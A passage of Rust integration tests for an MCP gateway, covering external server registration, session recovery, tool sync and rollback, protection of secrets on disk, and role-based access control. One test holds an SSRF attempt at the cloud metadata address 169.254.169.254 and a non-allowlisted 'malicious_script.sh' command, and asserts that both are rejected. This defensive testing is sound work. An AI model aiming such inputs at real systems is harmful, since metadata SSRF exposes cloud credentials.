    assert!(validate_mcp_response(&disc_resp.to_json(), "2026-07-28").is_ok());

    // Mixed case headers support on Streamable HTTP
    let mut mixed_case_headers = HashMap::new();
    mixed_case_headers.insert("Content-Type".to_string(), "application/json".to_string());
    mixed_case_headers.insert("Mcp-Method".to_string(), "tools/call".to_string());
    mixed_case_headers.insert("Mcp-Name".to_string(), "explain_error".to_string());
    let (m_status, _, m_resp_headers, _) =
        ctx.handle_http("POST", "/omni/mcp", &mixed_case_headers, &valid_body);
    assert_eq!(m_status, 200);
    assert!(m_resp_headers
        .iter()
        .any(|(k, v)| k.eq_ignore_ascii_case("mcp-method") && v == "tools/call"));

    // 6. RFC 9728 Protected Resource Metadata (B6) and WWW-Authenticate headers
    let empty_h = HashMap::new();
    let (meta_status, _, _, meta_body) = ctx.handle_http(
        "GET",
        "/.well-known/oauth-protected-resource",
        &empty_h,
        &[],
    );
    assert_eq!(meta_status, 200);
    let meta_json = JsonValue::parse(&String::from_utf8(meta_body).unwrap()).unwrap();
    assert!(meta_json.get("resource").is_some());
    assert!(meta_json.get("authorization_servers").is_some());

    // 401 returns WWW-Authenticate with resource_metadata
    let (u401_status, _, u401_headers, _) = ctx.handle_http("GET", "/api/stats", &empty_h, &[]);
    assert_eq!(u401_status, 401);
    let www_auth_401 = u401_headers
        .iter()
        .find(|(k, _)| k.eq_ignore_ascii_case("www-authenticate"))
        .unwrap();
    assert!(www_auth_401
        .1
        .contains("resource_metadata=\"/.well-known/oauth-protected-resource\""));

    // 403 returns WWW-Authenticate with error="insufficient_scope"
    let mut agent_h = HashMap::new();
    agent_h.insert(
        "authorization".to_string(),
        "Bearer agent_token".to_string(),
    );
    let (f403_status, _, f403_headers, _) =
        ctx.handle_http("POST", "/api/crawler/trigger", &agent_h, &[]);
    assert_eq!(f403_status, 403);
    let www_auth_403 = f403_headers
        .iter()
        .find(|(k, _)| k.eq_ignore_ascii_case("www-authenticate"))
        .unwrap();
    assert!(www_auth_403.1.contains("error=\"insufficient_scope\""));

    // 7. Route versioning (/api/v1/* -> /api/*) & OpenAPI spec (D8)
    let mut op_headers = HashMap::new();
    op_headers.insert(
        "authorization".to_string(),
        "Bearer operator_key".to_string(),
    );
    let (v1_status, _, _, v1_body) = ctx.handle_http("GET", "/api/v1/servers", &op_headers, &[]);
    let (v0_status, _, _, v0_body) = ctx.handle_http("GET", "/api/servers", &op_headers, &[]);
    assert_eq!(v1_status, 200);
    assert_eq!(v0_status, 200);
    assert_eq!(v1_body, v0_body);

    let (oapi_status, _, _, oapi_body) = ctx.handle_http("GET", "/openapi.json", &empty_h, &[]);
    assert_eq!(oapi_status, 200);
    let oapi_json = JsonValue::parse(&String::from_utf8(oapi_body).unwrap()).unwrap();
    assert_eq!(oapi_json["openapi"].as_str(), Some("3.0.3"));
    assert_eq!(oapi_json["info"]["version"].as_str(), Some("5.0.0"));

    // 8. Real CLI subcommand execution (C1)
    assert!(!AifxCLI::new(None, None).list_servers("table").is_empty());
    assert_eq!(
        omni_mcp::extension::run_aifx_cli(&["omni".to_string(), "--version".to_string()]),
        0
    );
    assert_eq!(
        omni_mcp::extension::run_aifx_cli(&["aifx".to_string(), "migrate".to_string()]),
        0
    );

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

// ====================================================================================
// v5.5.0 UNIFIED EXTERNAL MCP FLEET ACCEPTANCE SUITE (AC-1 through AC-9)
// ====================================================================================

#[test]
fn test_v5_5_ac1_stdio_e2e_registration_and_nonce_echo() {
    let dir = temp_test_path("omni_v5_5_ac1_stdio");
    let omni_bin = find_omni_binary();
    let omni_bin_str = omni_bin.to_string_lossy().to_string();

    let cfg = OmniConfig {
        data_dir: dir.clone(),
        stdio_allowlist: vec![omni_bin_str.clone()],
        ..Default::default()
    };
    let ctx = ProductionGatewayContext::new(Some(cfg));

    let mut admin_h = HashMap::new();
    admin_h.insert(
        "authorization".to_string(),
        "Bearer admin_dev_token".to_string(),
    );

    // 1. Register stdio external server
    let reg_body = json!({
        "name": "stdio-echo",
        "display_name": "Stdio Echo Server",
        "description": "Subprocess stdio MCP server",
        "transport": {
            "transport": "stdio",
            "command": omni_bin_str,
            "args": ["mcp", "mock-echo-mcp"]
        }
    });
    let (status, _, _, body) = ctx.handle_http(
        "POST",
        "/api/v1/servers/external/register",
        &admin_h,
        &reg_body.to_string_compact().into_bytes(),
    );
    assert_eq!(
        status,
        200,
        "Registration failed: {}",
        String::from_utf8_lossy(&body)
    );

    // 2. Enable server and tool
    let toggle_srv = json!({ "serverName": "external-mcp:stdio-echo", "status": "ENABLED" });
    ctx.handle_http(
        "POST",
        "/api/servers/toggle_status",
        &admin_h,
        &toggle_srv.to_string_compact().into_bytes(),
    );
    let toggle_tool = json!({ "serverName": "external-mcp:stdio-echo", "toolName": "echo_nonce", "status": "ENABLED" });
    ctx.handle_http(
        "POST",
        "/api/tools/toggle_status",
        &admin_h,
        &toggle_tool.to_string_compact().into_bytes(),
    );

    // 3. Invoke via /omni/mcp tools/call
    let nonce = "crypto_nonce_xyz_777";
    let call_req = json!({
        "jsonrpc": "2.0",
        "id": 101,
        "method": "tools/call",
        "params": {
            "name": "echo_nonce",
            "arguments": { "nonce": nonce }
        }
    });
    let (c_status, _, _, c_body) = ctx.handle_http(
        "POST",
        "/omni/mcp",
        &admin_h,
        &call_req.to_string_compact().into_bytes(),
    );
    assert_eq!(c_status, 200);
    let c_json = JsonValue::parse(&String::from_utf8(c_body).unwrap()).unwrap();
    assert_eq!(c_json["result"]["content"][0]["text"].as_str(), Some(nonce));

    // 4. Invoke via Code Mode script
    let code_script = format!(
        "const res = await call_tool('external-mcp:stdio-echo', 'echo_nonce', {{ nonce: '{}' }}); res.content[0].text;",
        nonce
    );
    let cm_res = ctx.gateway.execute_codemode(
        &code_script,
        None,
        false,
        "admin",
        None,
        Some("admin_dev_token"),
    );
    assert_eq!(cm_res.status, "OK");
    assert_eq!(cm_res.result.as_str(), Some(nonce));

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v5_5_ac2_streamable_http_session_lifecycle_and_404_recovery() {
    let dir = temp_test_path("omni_v5_5_ac2_http");
    let test_url = "http://127.0.0.1:18888/mcp";

    let session_count = Arc::new(std::sync::atomic::AtomicUsize::new(0));
    let call_attempts = Arc::new(std::sync::atomic::AtomicUsize::new(0));

    let sess_clone = session_count.clone();
    let call_clone = call_attempts.clone();

    omni_mcp::upstream::register_mock_http(test_url, move |_path, body, headers| {
        let body_str = String::from_utf8_lossy(body);
        let json_val = JsonValue::parse(&body_str).unwrap_or(JsonValue::Null);
        let method = json_val
            .get("method")
            .and_then(|m| m.as_str())
            .unwrap_or("");
        let id = json_val.get("id").cloned().unwrap_or(JsonValue::Null);

        let mut resp_headers = std::collections::BTreeMap::new();
        resp_headers.insert("content-type".to_string(), "application/json".to_string());

        if method == "initialize" {
            let s = sess_clone.fetch_add(1, std::sync::atomic::Ordering::SeqCst) + 1;
            let sid = format!("sess_{}", s);
            resp_headers.insert("mcp-session-id".to_string(), sid);
            let resp_body = json!({
                "jsonrpc": "2.0",
                "id": id,
                "result": {
                    "protocolVersion": "2025-11-25",
                    "capabilities": { "tools": {} },
                    "serverInfo": { "name": "mock-http-server", "version": "1.0.0" }
                }
            })
            .to_string_compact();
            (200, resp_headers, resp_body.into_bytes())
        } else if method == "notifications/initialized" {
            (200, resp_headers, Vec::new())
        } else if method == "tools/list" {
            let resp_body = json!({
                "jsonrpc": "2.0",
                "id": id,
                "result": {
                    "tools": [
                        {
                            "name": "http_echo",
                            "description": "HTTP echo tool",
                            "inputSchema": {
                                "type": "object",
                                "properties": { "msg": { "type": "string" } }
                            }
                        }
                    ]
                }
            })
            .to_string_compact();
            (200, resp_headers, resp_body.into_bytes())
        } else if method == "tools/call" {
            let att = call_clone.fetch_add(1, std::sync::atomic::Ordering::SeqCst) + 1;
            if att == 1 {
                (404, resp_headers, b"Session expired".to_vec())
            } else {
                let sid_hdr = headers.get("mcp-session-id").map(|s| s.as_str());
                assert_eq!(
                    sid_hdr,
                    Some("sess_2"),
                    "Expected refreshed session ID sess_2 on retry"
                );
                let msg = json_val["params"]["arguments"]["msg"]
                    .as_str()
                    .unwrap_or("no-msg");
                let resp_body = json!({
                    "jsonrpc": "2.0",
                    "id": id,
                    "result": {
                        "content": [
                            { "type": "text", "text": msg }
                        ]
                    }
                })
                .to_string_compact();
                (200, resp_headers, resp_body.into_bytes())
            }
        } else {
            (400, resp_headers, b"Unknown method".to_vec())
        }
    });

    let cfg = OmniConfig {
        data_dir: dir.clone(),
        allow_loopback_upstream: true,
        ..Default::default()
    };
    let ctx = ProductionGatewayContext::new(Some(cfg));

    let mut admin_h = HashMap::new();
    admin_h.insert(
        "authorization".to_string(),
        "Bearer admin_dev_token".to_string(),
    );

    let reg_body = json!({
        "name": "remote-http",
        "display_name": "Remote HTTP MCP Server",
        "description": "Streamable HTTP MCP server",
        "transport": {
            "transport": "streamable_http",
            "url": test_url,
            "session_mode": "stateful"
        }
    });

    let (status, _, _, body) = ctx.handle_http(
        "POST",
        "/api/v1/servers/external/register",
        &admin_h,
        &reg_body.to_string_compact().into_bytes(),
    );
    assert_eq!(
        status,
        200,
        "Registration failed: {}",
        String::from_utf8_lossy(&body)
    );

    let toggle_srv = json!({ "serverName": "external-mcp:remote-http", "status": "ENABLED" });
    ctx.handle_http(
        "POST",
        "/api/servers/toggle_status",
        &admin_h,
        &toggle_srv.to_string_compact().into_bytes(),
    );
    let toggle_tool = json!({ "serverName": "external-mcp:remote-http", "toolName": "http_echo", "status": "ENABLED" });
    ctx.handle_http(
        "POST",
        "/api/tools/toggle_status",
        &admin_h,
        &toggle_tool.to_string_compact().into_bytes(),
    );

    let call_req = json!({
        "jsonrpc": "2.0",
        "id": 202,
        "method": "tools/call",
        "params": {
            "name": "http_echo",
            "arguments": { "msg": "hello_http_recovery" }
        }
    });
    let (c_status, _, _, c_body) = ctx.handle_http(
        "POST",
        "/omni/mcp",
        &admin_h,
        &call_req.to_string_compact().into_bytes(),
    );
    assert_eq!(c_status, 200);
    let c_json = JsonValue::parse(&String::from_utf8(c_body).unwrap()).unwrap();
    assert_eq!(
        c_json["result"]["content"][0]["text"].as_str(),
        Some("hello_http_recovery")
    );

    omni_mcp::upstream::clear_mock_http(test_url);
    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v5_5_ac3_first_class_surface_inheritance() {
    let dir = temp_test_path("omni_v5_5_ac3_surface");
    let cfg = OmniConfig {
        data_dir: dir.clone(),
        ..Default::default()
    };
    let ctx = ProductionGatewayContext::new(Some(cfg));

    let mut ext_server = ServerRecord::new(
        "external-mcp:billing",
        "External Billing Service",
        "External billing tools",
        "finance",
    );
    ext_server.protocol = ProtocolType::ExternalMcp;
    let mut ext_tool = ToolRecord::new(
        "generate_invoice",
        "Generate customer invoice PDF",
        json!({"type": "object", "properties": {"amount": {"type": "number"}}}),
    );
    ext_tool.protocol = ProtocolType::ExternalMcp;
    ext_tool.status = ToolStatus::Disabled;
    ext_server.add_tool(ext_tool);
    ctx.registry.register_server(ext_server);
    ctx.cache.refresh_now();

    // 1. While Disabled: must not appear in discover_tools or .d.ts
    let disc_req = RPCRequest::new(
        1i64,
        "tools/call",
        json!({"name": "discover_tools", "arguments": {"server_name": "external-mcp:billing"}}),
    );
    let disc_resp = ctx.omni_mcp.handle_request(&disc_req, "agent", None);
    let text_before = disc_resp.result.unwrap()["content"][0]["text"]
        .as_str()
        .unwrap()
        .to_string();
    assert!(
        !text_before.contains("generate_invoice"),
        "Disabled external tool must not appear in discover_tools"
    );
    let ts_before = ctx.gateway.generate_codemode_types(None, None);
    assert!(
        !ts_before
            .typescript_declarations
            .contains("generate_invoice"),
        "Disabled external tool must not appear in .d.ts"
    );

    // 2. Enable server and tool
    ctx.registry
        .toggle_server_status("external-mcp:billing", ToolStatus::Enabled);
    ctx.registry.toggle_tool_status(
        "external-mcp:billing",
        "generate_invoice",
        ToolStatus::Enabled,
    );
    ctx.cache.refresh_now();

    // 3. Immediately visible
    let disc_resp_after = ctx.omni_mcp.handle_request(&disc_req, "agent", None);
    let text_after = disc_resp_after.result.unwrap()["content"][0]["text"]
        .as_str()
        .unwrap()
        .to_string();
    assert!(
        text_after.contains("generate_invoice"),
        "Enabled external tool must appear in discover_tools"
    );
    let ts_after = ctx.gateway.generate_codemode_types(None, None);
    assert!(
        ts_after
            .typescript_declarations
            .contains("generate_invoice"),
        "Enabled external tool must appear in .d.ts"
    );

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v5_5_ac4_rediscovery_provenance_and_rollback() {
    let dir = temp_test_path("omni_v5_5_ac4_sync");
    let cfg = OmniConfig {
        data_dir: dir.clone(),
        ..Default::default()
    };
    let ctx = ProductionGatewayContext::new(Some(cfg));

    // Initial server with tool v1
    let mut server = ServerRecord::new(
        "external-mcp:inventory",
        "Inventory",
        "Warehouse tools",
        "logistics",
    );
    server.protocol = ProtocolType::ExternalMcp;
    let mut tool1 = ToolRecord::new(
        "check_stock",
        "Check stock level v1",
        json!({"type": "object", "properties": {"sku": {"type": "string"}}}),
    );
    tool1.protocol = ProtocolType::ExternalMcp;
    tool1.status = ToolStatus::Enabled;
    tool1.schema_source = SchemaSource::Upstream;
    server.add_tool(tool1);

    let mut tool_to_retire = ToolRecord::new(
        "legacy_barcode",
        "Legacy barcode scanner",
        json!({"type": "object"}),
    );
    tool_to_retire.protocol = ProtocolType::ExternalMcp;
    tool_to_retire.status = ToolStatus::Enabled;
    server.add_tool(tool_to_retire);

    ctx.registry.register_server(server);
    ctx.cache.refresh_now();

    // Reconcile with:
    // - check_stock updated (description changed)
    // - new_tool added
    // - legacy_barcode omitted (retired)
    let updated_t1 = ToolRecord::new(
        "check_stock",
        "Check stock level v2 with warehouse bin location",
        json!({"type": "object", "properties": {"sku": {"type": "string"}, "bin": {"type": "string"}}}),
    );
    let new_t2 = ToolRecord::new(
        "reserve_stock",
        "Reserve stock for shipment",
        json!({"type": "object"}),
    );

    let sync_res = ctx
        .registry
        .apply_external_sync(
            "external-mcp:inventory",
            vec![updated_t1.clone(), new_t2.clone()],
        )
        .expect("Sync must succeed");

    assert_eq!(sync_res.added, 1);
    assert_eq!(sync_res.updated, 1);
    assert_eq!(sync_res.retired, 1);
    assert_eq!(sync_res.unchanged, 0);

    // Verify updated tool preserved its Enabled status
    let srv = ctx.registry.get_server("external-mcp:inventory").unwrap();
    let t1_live = srv.get_tool("check_stock").unwrap();
    assert_eq!(t1_live.status, ToolStatus::Enabled);
    assert_eq!(t1_live.version, 2);

    // Verify retired tool is Unavailable
    let retired_live = srv.get_tool("legacy_barcode").unwrap();
    assert_eq!(retired_live.status, ToolStatus::Unavailable);
    assert!(retired_live.retired_at.is_some());

    // Verify auto-approved diff exists with origin: ExternalSync
    let diffs = ctx.registry.list_pending_diffs(None);
    assert!(diffs.is_empty());

    // Rollback check_stock to v1
    assert!(ctx
        .registry
        .rollback_tool("external-mcp:inventory", "check_stock", 1));
    let srv_rolled = ctx.registry.get_server("external-mcp:inventory").unwrap();
    let t1_rolled = srv_rolled.get_tool("check_stock").unwrap();
    assert_eq!(t1_rolled.version, 1);
    assert_eq!(t1_rolled.description, "Check stock level v1");

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v5_5_ac5_human_override_protection_and_cas_guard() {
    let dir = temp_test_path("omni_v5_5_ac5_human");
    let cfg = OmniConfig {
        data_dir: dir.clone(),
        ..Default::default()
    };
    let ctx = ProductionGatewayContext::new(Some(cfg));

    let mut server = ServerRecord::new("external-mcp:crm", "CRM", "Customer records", "sales");
    server.protocol = ProtocolType::ExternalMcp;
    let mut tool = ToolRecord::new(
        "update_lead",
        "Original upstream description",
        json!({"type": "object"}),
    );
    tool.protocol = ProtocolType::ExternalMcp;
    tool.status = ToolStatus::Enabled;
    tool.schema_source = SchemaSource::Upstream;
    server.add_tool(tool);
    ctx.registry.register_server(server);

    // 1. Human operator proposes and approves update
    let diff = ctx
        .registry
        .propose_tool_update(
            "external-mcp:crm",
            "update_lead",
            Some("Human curated description for sales team"),
            None,
            "operator_alice",
        )
        .unwrap();

    assert!(ctx
        .registry
        .approve_diff(&diff.diff_id, "lead_bob")
        .unwrap());
    let t_human = ctx
        .registry
        .get_server("external-mcp:crm")
        .unwrap()
        .get_tool("update_lead")
        .unwrap()
        .clone();
    assert_eq!(t_human.schema_source, SchemaSource::Human);
    assert_eq!(
        t_human.description,
        "Human curated description for sales team"
    );

    // 2. Upstream sync attempts to overwrite with divergent description
    let upstream_tool = ToolRecord::new(
        "update_lead",
        "Automated upstream change that conflicts with human override",
        json!({"type": "object"}),
    );

    let sync_res = ctx
        .registry
        .apply_external_sync("external-mcp:crm", vec![upstream_tool])
        .unwrap();
    assert_eq!(sync_res.pending_human_conflicts, 1);

    // Assert human description is PRESERVED on live tool
    let t_preserved = ctx
        .registry
        .get_server("external-mcp:crm")
        .unwrap()
        .get_tool("update_lead")
        .unwrap()
        .clone();
    assert_eq!(
        t_preserved.description,
        "Human curated description for sales team"
    );

    // Assert unapproved diff was queued
    let pending = ctx.registry.list_pending_diffs(None);
    assert_eq!(pending.len(), 1);
    assert_eq!(pending[0].server_name, "external-mcp:crm");

    // 3. CAS guard: if version has advanced, approve_diff returns CONFLICT
    let diff_2 = ctx
        .registry
        .propose_tool_update(
            "external-mcp:crm",
            "update_lead",
            Some("Version 3 description"),
            None,
            "lead_bob",
        )
        .unwrap();

    // Advance tool to version 3 by approving diff_2
    assert!(ctx
        .registry
        .approve_diff(&diff_2.diff_id, "lead_bob")
        .unwrap());

    // Now attempting to approve pending[0] (which expected previous_version: 2, but tool is now v3)
    let cas_res = ctx.registry.approve_diff(&pending[0].diff_id, "approver");
    assert!(cas_res.is_err());
    assert!(cas_res.unwrap_err().contains("CONFLICT"));

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v5_5_ac6_zero_secret_bytes_on_disk() {
    let dir = temp_test_path("omni_v5_5_ac6_zero_secret");
    let secrets_dir = PathBuf::from(&dir).join("secrets");
    fs::create_dir_all(&secrets_dir).unwrap();

    let secret_file = secrets_dir.join("api_token.txt");
    fs::write(&secret_file, "raw_sensitive_secret_value_12345").unwrap();

    env::set_var("TEST_UPSTREAM_ENV_KEY", "super_secret_env_value_67890");

    let db_path = format!("{}/registry.db", dir);
    let store = Arc::new(WalRegistryStore::new(&db_path));
    let registry = MCPRegistry::new(Some(store.clone()));

    let mut env_refs = std::collections::BTreeMap::new();
    env_refs.insert(
        "SECRET_KEY".to_string(),
        "{env:TEST_UPSTREAM_ENV_KEY}".to_string(),
    );
    env_refs.insert(
        "TOKEN_FILE".to_string(),
        "{file:./api_token.txt}".to_string(),
    );

    let mut ext_server = ServerRecord::new(
        "external-mcp:secure-fleet",
        "Secure Fleet",
        "Zero raw secrets on disk",
        "security",
    );
    ext_server.protocol = ProtocolType::ExternalMcp;
    ext_server.upstream_config = Some(UpstreamTransportConfig::Stdio {
        command: "node".to_string(),
        canonical_command: "C:\\Program Files\\nodejs\\node.exe".to_string(),
        args: vec!["server.js".to_string()],
        env_refs,
        cwd: None,
    });

    registry.register_server(ext_server);

    store.checkpoint_snapshot();
    store.close();

    let disk_raw = fs::read_to_string(&db_path).unwrap();
    assert!(
        !disk_raw.contains("super_secret_env_value_67890"),
        "Raw environment secret must never appear on disk"
    );
    assert!(
        !disk_raw.contains("raw_sensitive_secret_value_12345"),
        "Raw file secret must never appear on disk"
    );
    assert!(disk_raw.contains("{env:TEST_UPSTREAM_ENV_KEY}"));
    assert!(disk_raw.contains("{file:./api_token.txt}"));

    env::remove_var("TEST_UPSTREAM_ENV_KEY");
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v5_5_ac7_sanitized_identifier_collision_rejection() {
    let dir = temp_test_path("omni_v5_5_ac7_collision");
    let cfg = OmniConfig {
        data_dir: dir.clone(),
        ..Default::default()
    };
    let ctx = ProductionGatewayContext::new(Some(cfg));

    let mut admin_h = HashMap::new();
    admin_h.insert(
        "authorization".to_string(),
        "Bearer admin_dev_token".to_string(),
    );

    // 1. Server collision: "payments-service" vs "payments_service"
    let s1 = ServerRecord::new("payments_service", "Payments", "Desc", "fin");
    ctx.registry.register_server(s1);

    let reg_coll = json!({
        "name": "payments-service",
        "transport": {
            "transport": "streamable_http",
            "url": "http://127.0.0.1:8080/mcp"
        }
    });
    let (s_code, _, _, s_body) = ctx.handle_http(
        "POST",
        "/api/v1/servers/external/register",
        &admin_h,
        &reg_coll.to_string_compact().into_bytes(),
    );
    assert_eq!(s_code, 409);
    let s_json = JsonValue::parse(&String::from_utf8(s_body).unwrap()).unwrap();
    assert_eq!(s_json["error"].as_str(), Some("IDENTIFIER_COLLISION"));

    // 2. Tool collision within a server: "web-search" vs "web_search"
    let tools = vec![
        ToolRecord::new("web-search", "Search web", json!({"type": "object"})),
        ToolRecord::new(
            "web_search",
            "Search web duplicate",
            json!({"type": "object"}),
        ),
    ];
    let t_coll = ctx
        .registry
        .check_identifier_collisions("external-mcp:test", &tools);
    assert!(t_coll.is_err());
    let err = t_coll.unwrap_err();
    assert_eq!(err.sanitized, "web_search");
    assert_eq!(err.first_raw, "web-search");
    assert_eq!(err.second_raw, "web_search");

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v5_5_ac8_rbac_and_allowlist_enforcement() {
    let dir = temp_test_path("omni_v5_5_ac8_rbac");
    let cfg = OmniConfig {
        data_dir: dir.clone(),
        stdio_allowlist: vec!["/bin/allowed_cmd".to_string()],
        allow_loopback_upstream: false,
        ..Default::default()
    };
    let ctx = ProductionGatewayContext::new(Some(cfg));

    let roles = [
        ("Bearer agent_dev_token", "Agent"),
        ("Bearer operator_dev_token", "Operator"),
        ("Bearer approver_dev_token", "Approver"),
    ];

    for (token, role_name) in roles {
        let mut h = HashMap::new();
        h.insert("authorization".to_string(), token.to_string());

        let (st1, _, _, _) =
            ctx.handle_http("POST", "/api/v1/servers/external/register", &h, b"{}");
        assert_eq!(
            st1, 403,
            "Role {} must be forbidden from /register",
            role_name
        );

        let (st2, _, _, _) =
            ctx.handle_http("POST", "/api/v1/servers/external/srv/deregister", &h, b"{}");
        assert_eq!(
            st2, 403,
            "Role {} must be forbidden from /deregister",
            role_name
        );

        let (st3, _, _, _) =
            ctx.handle_http("POST", "/api/v1/servers/external/srv/rediscover", &h, b"{}");
        assert_eq!(
            st3, 403,
            "Role {} must be forbidden from /rediscover",
            role_name
        );

        let (st4, _, _, _) = ctx.handle_http("POST", "/api/servers/toggle_status", &h, b"{}");
        assert_eq!(
            st4, 403,
            "Role {} must be forbidden from /api/servers/toggle_status",
            role_name
        );
    }

    let mut admin_h = HashMap::new();
    admin_h.insert(
        "authorization".to_string(),
        "Bearer admin_dev_token".to_string(),
    );

    let non_allow = json!({
        "name": "unauthorized-cmd",
        "transport": {
            "transport": "stdio",
            "command": "malicious_script.sh"
        }
    });
    let (st_cmd, _, _, body_cmd) = ctx.handle_http(
        "POST",
        "/api/v1/servers/external/register",
        &admin_h,
        &non_allow.to_string_compact().into_bytes(),
    );
    assert_eq!(
        st_cmd,
        403,
        "Non-allowlisted binary must receive 403: {}",
        String::from_utf8_lossy(&body_cmd)
    );

    let ssrf_req = json!({
        "name": "metadata-target",
        "transport": {
            "transport": "streamable_http",
            "url": "http://169.254.169.254/latest/meta-data"
        }
    });
    let (st_ssrf, _, _, body_ssrf) = ctx.handle_http(
        "POST",
        "/api/v1/servers/external/register",
        &admin_h,
        &ssrf_req.to_string_compact().into_bytes(),
    );
    assert_eq!(
        st_ssrf,
        403,
        "Metadata IP must receive 403: {}",
        String::from_utf8_lossy(&body_ssrf)
    );

    let https_req = json!({
        "name": "tls-target",
        "transport": {
            "transport": "streamable_http",
            "url": "https://api.github.com/mcp"
        }
    });
    let (st_tls, _, _, body_tls) = ctx.handle_http(
        "POST",
        "/api/v1/servers/external/register",
        &admin_h,
        &https_req.to_string_compact().into_bytes(),
    );
    assert_eq!(st_tls, 400);
    let tls_json = JsonValue::parse(&String::from_utf8(body_tls).unwrap()).unwrap();
    assert_eq!(tls_json["code"].as_i64(), Some(-32014));

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v5_5_ac9_supervision_stderr_flood_and_shutdown() {
    let dir = temp_test_path("omni_v5_5_ac9_supervision");
    let omni_bin = find_omni_binary();
    let omni_bin_str = omni_bin.to_string_lossy().to_string();

    let cfg = OmniConfig {
        data_dir: dir.clone(),
        stdio_allowlist: vec![omni_bin_str.clone()],
        ..Default::default()
    };
    let ctx = ProductionGatewayContext::new(Some(cfg));

    let mut admin_h = HashMap::new();
    admin_h.insert(
        "authorization".to_string(),
        "Bearer admin_dev_token".to_string(),
    );

    let reg_body = json!({
        "name": "flood-server",
        "display_name": "Stderr Flood Server",
        "description": "Tests deadlock freedom on stderr flood",
        "transport": {
            "transport": "stdio",
            "command": omni_bin_str,
            "args": ["mcp", "mock-echo-mcp", "--flood-stderr"]
        }
    });

    let (status, _, _, body) = ctx.handle_http(
        "POST",
        "/api/v1/servers/external/register",
        &admin_h,
        &reg_body.to_string_compact().into_bytes(),
    );
    assert_eq!(
        status,
        200,
        "Registration failed: {}",
        String::from_utf8_lossy(&body)
    );

    let toggle_srv = json!({ "serverName": "external-mcp:flood-server", "status": "ENABLED" });
    ctx.handle_http(
        "POST",
        "/api/servers/toggle_status",
        &admin_h,
        &toggle_srv.to_string_compact().into_bytes(),
    );
    let toggle_tool = json!({ "serverName": "external-mcp:flood-server", "toolName": "echo_nonce", "status": "ENABLED" });
    ctx.handle_http(
        "POST",
        "/api/tools/toggle_status",
        &admin_h,
        &toggle_tool.to_string_compact().into_bytes(),
    );

    let call_req = json!({
        "jsonrpc": "2.0",
        "id": 901,
        "method": "tools/call",
        "params": {
            "name": "echo_nonce",
            "arguments": { "nonce": "flood_resilient_nonce_123" }
        }
    });
    let (c_status, _, _, c_body) = ctx.handle_http(
        "POST",
        "/omni/mcp",
        &admin_h,
        &call_req.to_string_compact().into_bytes(),
    );
    assert_eq!(
        c_status, 200,
        "Tool call deadlocked or failed after stderr flood"
    );
    let c_json = JsonValue::parse(&String::from_utf8(c_body).unwrap()).unwrap();
    assert_eq!(
        c_json["result"]["content"][0]["text"].as_str(),
        Some("flood_resilient_nonce_123")
    );

    let (insp_st, _, _, insp_body) = ctx.handle_http(
        "GET",
        "/api/v1/servers/external/flood-server/inspect",
        &admin_h,
        &[],
    );
    assert_eq!(insp_st, 200);
    let insp_json = JsonValue::parse(&String::from_utf8(insp_body).unwrap()).unwrap();
    let stderr_tail = insp_json["stderr_tail"]
        .as_array()
        .expect("stderr_tail array");
    assert!(
        stderr_tail.len() <= 256,
        "Ring buffer must be capped at 256 lines, got {}",
        stderr_tail.len()
    );
    assert!(
        !stderr_tail.is_empty(),
        "Ring buffer must have captured flooded lines"
    );

    ctx.upstream_manager.shutdown_all();
    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}
